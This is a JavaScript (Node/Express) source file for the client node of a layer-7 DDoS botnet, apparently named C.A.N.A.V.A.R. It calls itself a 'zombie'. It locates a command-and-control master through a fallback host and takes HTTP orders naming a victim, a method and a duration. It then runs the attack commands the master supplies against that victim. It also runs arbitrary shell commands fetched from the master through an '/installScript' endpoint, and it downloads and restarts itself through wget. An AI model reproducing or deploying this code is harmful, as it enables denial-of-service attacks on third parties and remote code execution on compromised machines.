const { exec } = require('child_process');

const express = require('express');
const app = express()

const fs = require('fs')
const axios = require('axios');
const EventEmitter = require('events')
const moment = require('moment')
const delay = require('delay')
let master = null
var masterReachable = new EventEmitter()
var settingIntegrity = new EventEmitter()
//process.chdir(__dirname)
const db = require('quick.db');
let htserver = null
let zombie = {
    port: null,
    currentAttack: {
        victim: null,
        doneby: null,
        id: null,
        timer: null,
        method: null
    },
    init: Date.now(),
    busy: false,
    installedScripts: []
}

function checkLocalMaster() {
    let localMaster = db.get('master.ip')
    if ((localMaster === null) || (localMaster === "null") || (localMaster === "") || localMaster === undefined) {
        console.log("No local master found. Falling back to disaster API.");
        axios.get("http://disaster.api.canavar.licentia.xyz")
            .then(res => {
                let mdata = res.data
                db.set('master', { ip: `${mdata}` })
                console.log("localMaster is set with", mdata);
                localMaster = mdata
                checkMaster(localMaster)
            })
            .catch(err => {
                console.error(err);
            })
    } else {
        if (localMaster.includes(".")) {
            checkMaster(localMaster)
            console.log("Valid localMaster data.", localMaster);
        } else {
            db.delete('master.ip')
            db.delete('master')
            console.log("Corrupt localMaster data. falling back again.");
            checkLocalMaster()
        }
    }
    return localMaster
}

checkLocalMaster()

function checkMaster(master_) {
    axios.get("http://" + master_)
        .then(res => {
            let code = res.statusCode
            let statusMessage = res.statusMessage
            let body = res.data
            if ((body === "OKAY" || (code === 200) && (statusMessage === "OK"))) {
                console.log("Master reached.", master_);
                masterReachable.emit('true', master_);
                master = master_
            } else {
                db.delete('master.ip')
                db.delete('master')
                console.log("Corrupt localMaster data. falling back again.");
                checkLocalMaster()
            }
        })
        .catch(err => {
            db.delete('master.ip')
            db.delete('master')
            console.log("Cannot reach master. falling back again.");
            console.log(master);
            console.log(err);
            checkLocalMaster()
        })
}


function fetchSettings() {
    axios.get("http://" + master + "/globals")
        .then(res => {
            zombie.port = res.data.port.number
            console.log(res.data);
            settingIntegrity.emit('true');
        })
        .catch(err => {
            console.error(err);
        })
}

masterReachable.on('true', (s) => {
    master = s
    console.log('Master has been reached!', s);
    fetchSettings()
});

settingIntegrity.on('true', () => {
    app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
        if (!(zombie.busy)) {
            let victim = req.params.victim
            let timelimit = req.params.time
            if (isNaN(timelimit)) {
                res.send(405, { error: "INVALID_TIME_LIMIT" })
            }
            else {
                axios.get("http://" + master + "/scripts?" + req.params.methodID)
                    .then(resp => {
                        let methodfilename = `./scripts/${resp.data.filename}`
                        if (fs.existsSync(methodfilename)) {
                            // path exists
                            console.log("exists:", methodfilename);
                            startAttack((resp.data), req.params.victim, req.params.time)
                            zombie.currentAttack.victim = req.params.victim
                            zombie.currentAttack.timer = req.params.time
                            zombie.currentAttack.id = req.params.id
                            zombie.currentAttack.method = resp.data
                            zombie.currentAttack.doneby = moment().add({ seconds: timelimit }).unix() * 1000
                            zombie.busy = true
                            res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                        } else {
                            console.log("DOES NOT exist:", methodfilename);
                            res.send(500, { error: {code: "SCRIPT_NOT_INSTALLED", message: "Script is not installed on the machine."} })
                        }
                    })
                    .catch(err => {
                        res.send(500, { error: err })
                    })

            }
        }
        else {
            res.send(405, { error: "MACHINE_IS_BUSY" })
        }
    })

    app.get('/status', (req, res) => {
        res.send(200, { zombie })
    })

    app.get('/update', (req, res) => {
        exec("cd /canavarl7; wget https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js -O index.js; systemctl restart canavarl7;", (err, stdout, stderr) => {
            if (err) {
                //some err occurred
                console.error(err)
            } else {
                // the *entire* stdout and stderr (buffered)
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
            }
        })
    })

    app.get('/installScript/:scriptid', (req, res) => {
        let scriptid = req.params.scriptid
        axios.get("http://" + master + "/scripts?" + scriptid)
            .then(resp => {
                console.log(resp.data)
                axios.get("http://" + master + "/setup?download_script&" + scriptid)
                    .then(resp => {
                        console.log("EXECUTE : " + resp.data)
                        exec(resp.data, (err, stdout, stderr) => {
                            if (err) {
                                //some err occurred
                                console.error(err)
                            } else {
                                // the *entire* stdout and stderr (buffered)
                                console.log(`stdout: ${stdout}`);
                                console.log(`stderr: ${stderr}`);
                            }
                        })
                        res.send(200)
                    })
                    .catch(err => {
                        res.send(500, { error: err.response.data.error })
                    })
            })
            .catch(err => {
                res.send(500, { error: err.response.data.error })
            })
    })
    app.get('/installService/', (req, res) => {
        console.log(resp.data)
        axios.get("http://" + master + "/setup?download_script")
            .then(resp => {
                console.log("EXECUTE : " + resp.data)
                res.send(200)
            })
            .catch(err => {
                res.send(500, { error: err.response.data.error })
            })
    })
    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))

    function checkSelf() {
        axios.get("http://" + master + "/globals")
            .then(res => {
                if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
                    console.log(res.data.port.changeAt < Date.now());
                    console.log(res.data.port.last === zombie.port);
                    zombie.port = res.data.port.number
                    htserver.close()
                    htserver = app.listen(zombie.port, () => console.log(`App listening on port! ${zombie.port}`))
                    console.log(res.data);
                }
            })
            .catch(err => {
                console.error(err);
            })
    }

    checkSelf();

    setInterval(function () {
        checkSelf()
        console.log(zombie.port);
    }, 6000)
});

async function startAttack(methodData, victim, time) {
    let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
    console.log(command);
        exec(command, (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.log(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });
    await delay (time * 1000)
    zombie.currentAttack = null
    exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
        if (err) {
            //some err occurred
            console.error(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });

}

async function heartbeat(){
    axios.get("http://" + master + "/heartbeat")
        .then(res => {
            SCRIPTS = res.data
        })
        .catch(err => {
            console.error(err);
        })
}

heartbeat();

setInterval(function(){
    heartbeat()
}, 5000)

/*

app.use((req, res, next) => {
    if (lockdown)
    let accessKey = req.headers.authorization
    if (!accessKey) {
        res.send(403)
    }
    if (!accessKey !==)
})



if ((process.argv.slice(2))[0] === "setup") {
    console.log("setup")
    exec('notepad', (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
        }
    });
} else {
    console.log("action")
}*/